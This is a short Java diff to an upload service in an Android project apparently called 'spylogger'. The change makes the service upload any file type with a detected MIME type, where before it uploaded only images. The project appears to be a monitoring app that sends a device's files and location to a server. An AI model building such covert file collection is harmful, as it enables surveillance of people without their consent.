@@ -1,13 +1,13 @@
 package com.gravatasufoca.spylogger.services;
 
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
+import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
 import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
 
 import java.io.File;
 
 import okhttp3.MediaType;
-import okhttp3.MultipartBody;
 import okhttp3.RequestBody;
 import retrofit2.Call;
 
@@ -22,9 +22,7 @@ public class SendArquivoService extends SendDataService<Boolean> {
     }
 
     public void enviar(File arquivo, EnvioArquivoVO envioArquivoVO){
-        MultipartBody.Part filePart = MultipartBody.Part.createFormData("file", arquivo.getName(), RequestBody.create(MediaType.parse("image/*"), arquivo));
-
-        Call<Boolean> call=sendApi.enviarArquivo(filePart,envioArquivoVO);
+        Call<Boolean> call=sendApi.enviarArquivo(RequestBody.create(MediaType.parse(Utils.getMimeType(arquivo.getAbsolutePath())),arquivo),envioArquivoVO);
         call.enqueue(this);
     }
 
